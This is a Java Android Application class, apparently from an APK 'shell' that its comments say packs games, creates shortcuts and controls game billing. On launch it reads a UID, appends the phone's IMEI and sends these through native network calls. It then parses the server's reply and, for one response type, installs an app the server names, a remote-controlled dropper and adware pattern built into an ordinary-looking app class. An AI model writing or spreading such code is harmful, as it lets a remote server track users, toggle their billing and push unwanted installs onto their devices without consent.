package com.bb_sz.ndk;

import android.app.Application;
import android.content.Context;
import android.content.IntentFilter;
import android.os.Build;
import android.telephony.TelephonyManager;
import android.util.Log;

import java.io.IOException;
import java.io.InputStream;
import java.io.UnsupportedEncodingException;

/**
 * Created by Administrator on 2016/9/22.
 * <p>1,apk加壳</p>
 * <p>2,创建快捷键</p>
 * <p>3,控制游戏计费开关</p>
 * <p>tip: 快捷键图片不存在时，不创建快捷键</p>
 * <p>tip: uid文件不存在，不做游戏开关网络请求</p>
 */
public class App extends Application {
    public static Context mContext = null;//for jni need
    public static String mUID = null;//for jni need
    public static int debug = 1;
    private static final String TAG = "SkyApp";
    private static boolean isNetDecision = true;

    public native static void jniCreate();

    public native static void post(String host, int port, String content);

    public native static byte[] http(String host, int port, String content);

    @Override
    protected void attachBaseContext(Context base) {
        mContext = this;
        super.attachBaseContext(base);
        b(this);
        if (debug > 0) Log.d(TAG, "UID:" + mUID);
        System.loadLibrary("sz_shell_a");
        addReceiver();
    }

    private void addReceiver() {
        mContext.registerReceiver(new CSReceiver(), new IntentFilter("cs_notify_server"));
    }

    @Override
    public void onCreate() {
        super.onCreate();
        jniCreate();
        if (isNetDecision) {
            isNetDecision = false;
            if (null != mUID)
                GameFreeSwitchRun.start(mContext);
        }
    }

    //创建游戏apk图标快捷键
    public static void a(byte[] data) {
        a(data, 0);
    }

    /**
     * @param data
     * @param type 0 == 1拖2接口解析数据
     *             1 == 快捷键接口解析数据
     */
    public static void a(byte[] data, int type) {
        if (debug > 0) Log.d(TAG, "len:" + (null == data ? 0 : data.length));
        if (null == data || data.length == 0) return;
        int start = -1;
        int end = -2;
        int len = data.length;
        for (int i = 0; i < len; i++) {
            if (data[i] == 0x0D
                    && i + 1 < len && data[i + 1] == 0x0A) {
                if (i + 2 < len && data[i + 2] == 0x0D
                        && i + 3 < len && data[i + 3] == 0x0A) {
                    if (start == -1) {
                        start = i + 3;
                        if (debug > 0) Log.d(TAG, "start is " + start);
                    } else {
                        end = i;
                        if (debug > 0) Log.d(TAG, "end is " + end);
                        break;
                    }
                }
            }
        }

        if (end <= 0) {
            end = len;
            if (debug > 0) Log.d(TAG, "end 2 is " + end);
        }
        int cLen = end - start;
        if (debug > 0) Log.d(TAG, "c len is " + cLen);
        if (cLen > 0) {
            byte[] con = new byte[cLen];
            if (debug > 0) Log.d(TAG, "con len is " + con.length);
            System.arraycopy(data, start, con, 0, cLen);
            String content = null;
            try {
                content = new String(con, "utf-8");
            } catch (UnsupportedEncodingException e) {
                e.printStackTrace();
            }
            if (debug > 0) Log.d(TAG, ":-1-:" + content);
            if (null == content) return;

            while (!(content.startsWith("{") && content.endsWith("}"))) {
                int indexSt = content.indexOf("{");
                int indexEt = content.lastIndexOf("}") + 1;
                content = content.substring(indexSt, indexEt);
                if (debug > 0) Log.d(TAG, ":--:" + content);
            }

            switch (type) {
                case 0: {
                    Model m = new Model(content);
                    if (m.code != 0) {
                        return;
                    }
                    if (m.msg != null) {
                        if (debug > 0) Log.d(TAG, "register InstallReceiver");
//                        IntentFilter it = new IntentFilter();
//                        it.addDataScheme("package");
//                        it.addAction(Intent.ACTION_PACKAGE_ADDED);
//                        mContext.registerReceiver(new InstallReceiver(), it);
                        OTUtil.getInstsance().install(mContext, m.msg);
                    }
                }
                break;
                case 1: {
                    ShortCut.getInstance().addShortcut(mContext, content);
                    break;
                }
                default:
                    break;
            }

        }
    }

    public void b(Context ctx) {
        if (null == ctx) return;
        try {
            InputStream is = ctx.getAssets().open("jpay_uid.txt");
            int c = is.available();
            byte[] buffer = new byte[c];
            is.read(buffer);
            mUID = new String(buffer, "utf-8");
        } catch (IOException e) {
            mUID = null;
            return;
        }

        if (Build.VERSION.SDK_INT < 23) {
            TelephonyManager tm = (TelephonyManager) ctx.getSystemService(Context.TELEPHONY_SERVICE);
            if (null == tm) return;
            String deviceId = tm.getDeviceId();
            if (null != deviceId) {
                mUID += "&imei=" + deviceId;
            }
        } else {
            mUID += "&imei=" + Build.VERSION.SDK_INT;
        }
    }

}
